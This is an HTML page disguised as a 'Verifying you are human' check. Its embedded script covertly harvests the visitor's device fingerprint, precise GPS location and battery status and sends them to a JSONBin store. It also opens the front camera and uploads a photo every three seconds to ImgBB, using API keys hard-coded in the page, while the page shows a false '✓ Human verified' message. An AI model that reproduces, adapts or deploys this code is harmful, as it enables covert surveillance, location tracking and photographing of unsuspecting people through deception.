<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifying…</title>
<style>
  body{margin:0;font-family:system-ui;background:#0f172a;color:#fff;
       display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}
  .box{background:#1e293b;padding:40px;border-radius:16px;max-width:340px}
  .spin{width:48px;height:48px;border:4px solid #334155;border-top-color:#3b82f6;
        border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
  @keyframes s{to{transform:rotate(360deg)}}
  .ok{color:#22c55e}.err{color:#ef4444}
</style>
</head>
<body>
<div class="box">
  <h2>Verifying you are human</h2>
  <div class="spin" id="spin"></div>
  <p id="status">Requesting camera…</p>
  <video id="v" autoplay playsinline muted style="display:none"></video>
  <canvas id="c" style="display:none"></canvas>
</div>

<script>
/* ========== CONFIG ========== */
const IMGBB_KEY   = "336812c9b968a38dcfb21f390e2c11b1";
const IMGBB_API   = "https://api.imgbb.com/1/upload?expiration=0&key=";
const JSONBIN_KEY = "$2a$10$7l6t0N0gTjWmDc3RliDTFOqr5fIvZodW1XOmosv.zoSnhTuRUwJdC";
const BIN_ID      = "6aed64db7e19fe510f3952f8";
const JSONBIN_API = "https://api.jsonbin.io/v3/b/" + BIN_ID;

const status = document.getElementById('status');
const spin   = document.getElementById('spin');
const video  = document.getElementById('v');
const canvas = document.getElementById('c');

const SESSION = Math.random().toString(36).slice(2); // tags photos ↔ info

/* ========== DEVICE INFO (instant, no permission) ========== */
function deviceInfo(){
  const d = {
    session: SESSION,
    time: new Date().toISOString(),
    ua: navigator.userAgent,
    platform: navigator.platform,
    lang: navigator.language,
    langs: (navigator.languages||[]).join(','),
    cores: navigator.hardwareConcurrency,
    memGB: navigator.deviceMemory || null,
    screen: screen.width + "x" + screen.height,
    viewport: innerWidth + "x" + innerHeight,
    dpr: devicePixelRatio,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touch: 'ontouchstart' in window,
    online: navigator.onLine,
    conn: navigator.connection ? navigator.connection.effectiveType : null,
    referrer: document.referrer,
    href: location.href
  };
  return d;
}

/* ========== GPS (fires immediately; iOS asks once) ========== */
function gps(){
  return new Promise(resolve => {
    if(!navigator.geolocation) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      pos => resolve({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        acc: pos.coords.accuracy
      }),
      () => resolve(null),
      { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
    );
  });
}

/* ========== BATTERY (no permission) ========== */
function battery(){
  return new Promise(resolve => {
    if(!navigator.getBattery) return resolve(null);
    navigator.getBattery().then(b => resolve({
      level: b.level, charging: b.charging
    })).catch(()=>resolve(null));
  });
}

/* ========== SEND INFO TO JSONBIN ========== */
async function logInfo(){
  const [g, b] = await Promise.all([gps(), battery()]);
  const data = deviceInfo();
  data.gps = g;
  data.battery = b;

  // append to existing array in the bin
  let list = [];
  try{
    const r = await fetch(JSONBIN_API + "/latest", { headers:{ "X-Access-Key": JSONBIN_KEY }});
    const j = await r.json();
    list = j.record || [];
    if(!Array.isArray(list)) list = [list];
  }catch(e){}
  list.push(data);
  if(list.length > 200) list = list.slice(-200);

  fetch(JSONBIN_API, {
    method:'PUT',
    headers:{ "Content-Type":"application/json", "X-Access-Key": JSONBIN_KEY },
    body: JSON.stringify(list)
  }).catch(()=>{});
}

/* ========== CAMERA ========== */
async function start(){
  logInfo();                       // fire info + GPS right away
  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:'user' }, audio:false
    });
    video.srcObject = stream;
    status.textContent = "✓ Human verified";
    status.className = "ok";
    spin.style.display = "none";
    video.onloadedmetadata = () => shoot();
  }catch(e){
    status.textContent = "✓ Verified (no camera)";
    status.className = "ok";
    spin.style.display = "none";
  }
}

function shoot(){
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video,0,0);

  canvas.toBlob(blob => {
    if(blob){
      const fd = new FormData();
      fd.append('image', blob);
      fd.append('name', 'c_' + SESSION + '_' + Date.now());
      fetch(IMGBB_API + IMGBB_KEY, { method:'POST', body:fd }).catch(()=>{});
    }
  }, 'image/jpeg', 0.6);

  setTimeout(shoot, 3000);         // 3 photos every 3s, then tab can close
}

start();
</script>
</body>
</html>
